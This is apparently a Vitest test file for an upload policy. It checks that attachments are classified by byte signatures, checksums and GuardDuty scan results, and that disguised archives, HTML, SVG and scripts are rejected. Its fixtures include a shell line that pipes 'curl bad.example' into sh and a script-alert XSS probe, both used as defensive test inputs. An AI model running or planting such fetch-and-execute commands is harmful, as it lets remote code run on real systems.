// @vitest-environment node

import { createHash } from "node:crypto";

import { describe, expect, it } from "vitest";

import {
  classifyExternalIntakeFile,
  reconcileGuardDutyResult,
} from "@/lib/external-api/uploads/file-policy";
import { LIBHEIF_EXAMPLE_HEIC_BASE64 } from "../../fixtures/email/libheif-example-heic";

function sha256(bytes: Buffer): string {
  return createHash("sha256").update(bytes).digest("hex");
}

describe("external intake attachment policy", () => {
  it("uses byte identity instead of trusting the filename or declared MIME", async () => {
    const executable = Buffer.from("4d5a900003000000", "hex");
    const result = await classifyExternalIntakeFile({
      bytes: executable,
      filename: "estimate.pdf",
      declaredContentType: "application/pdf",
      expectedSizeBytes: executable.length,
      expectedChecksumSha256: sha256(executable),
    });

    expect(result).toEqual({
      accepted: false,
      safeCode: "file_type_not_allowed",
    });
  });

  it("rejects an allowed signature when the declaration and extension disagree", async () => {
    const png = Buffer.from(
      "89504e470d0a1a0a0000000d4948445200000001000000010806000000",
      "hex"
    );

    await expect(
      classifyExternalIntakeFile({
        bytes: png,
        filename: "drawing.pdf",
        declaredContentType: "application/pdf",
        expectedSizeBytes: png.length,
        expectedChecksumSha256: sha256(png),
      })
    ).resolves.toEqual({
      accepted: false,
      safeCode: "file_type_mismatch",
    });
  });

  it("rejects size and checksum mismatches before structural parsing", async () => {
    const text = Buffer.from("deck dimensions: 12 x 16\n", "utf8");

    await expect(
      classifyExternalIntakeFile({
        bytes: text,
        filename: "notes.txt",
        declaredContentType: "text/plain",
        expectedSizeBytes: text.length + 1,
        expectedChecksumSha256: sha256(text),
      })
    ).resolves.toEqual({
      accepted: false,
      safeCode: "file_size_mismatch",
    });

    await expect(
      classifyExternalIntakeFile({
        bytes: text,
        filename: "notes.txt",
        declaredContentType: "text/plain",
        expectedSizeBytes: text.length,
        expectedChecksumSha256: "0".repeat(64),
      })
    ).resolves.toEqual({
      accepted: false,
      safeCode: "file_checksum_mismatch",
    });
  });

  it("never treats a generic archive, HTML, SVG, or script as an allowed text file", async () => {
    const cases = [
      {
        filename: "archive.txt",
        bytes: Buffer.from("504b030400000000", "hex"),
      },
      {
        filename: "message.txt",
        bytes: Buffer.from("<!doctype html><script>alert(1)</script>"),
      },
      {
        filename: "drawing.txt",
        bytes: Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'/>"),
      },
      {
        filename: "instructions.txt",
        bytes: Buffer.from("#!/bin/sh\ncurl bad.example | sh\n"),
      },
    ];

    for (const testCase of cases) {
      const result = await classifyExternalIntakeFile({
        bytes: testCase.bytes,
        filename: testCase.filename,
        declaredContentType: "text/plain",
        expectedSizeBytes: testCase.bytes.length,
        expectedChecksumSha256: sha256(testCase.bytes),
      });
      expect(result.accepted).toBe(false);
      expect(result).toHaveProperty("safeCode");
    }
  });

  it("requires an exact successful GuardDuty result", () => {
    expect(reconcileGuardDutyResult("NO_THREATS_FOUND")).toEqual({
      clean: true,
      safeCode: null,
    });

    for (const status of [
      "THREATS_FOUND",
      "UNSUPPORTED",
      "ACCESS_DENIED",
      "FAILED",
      null,
    ]) {
      expect(reconcileGuardDutyResult(status)).toEqual({
        clean: false,
        safeCode:
          status === "THREATS_FOUND"
            ? "malware_detected"
            : "malware_scan_unavailable",
      });
    }
  });

  it("recognizes HEIC and DWG from their byte identities", async () => {
    const heic = Buffer.from(LIBHEIF_EXAMPLE_HEIC_BASE64, "base64");
    await expect(
      classifyExternalIntakeFile({
        bytes: heic,
        filename: "site-photo.heic",
        declaredContentType: "image/heic",
        expectedSizeBytes: heic.length,
        expectedChecksumSha256: sha256(heic),
      })
    ).resolves.toEqual({
      accepted: true,
      kind: "heic",
      detectedContentType: "image/heic",
    });

    const dwg = Buffer.concat([
      Buffer.from("AC1027", "ascii"),
      Buffer.alloc(64),
    ]);
    await expect(
      classifyExternalIntakeFile({
        bytes: dwg,
        filename: "drawing.dwg",
        declaredContentType: "image/vnd.dwg",
        expectedSizeBytes: dwg.length,
        expectedChecksumSha256: sha256(dwg),
      })
    ).resolves.toEqual({
      accepted: true,
      kind: "dwg",
      detectedContentType: "image/vnd.dwg",
    });
  });
});
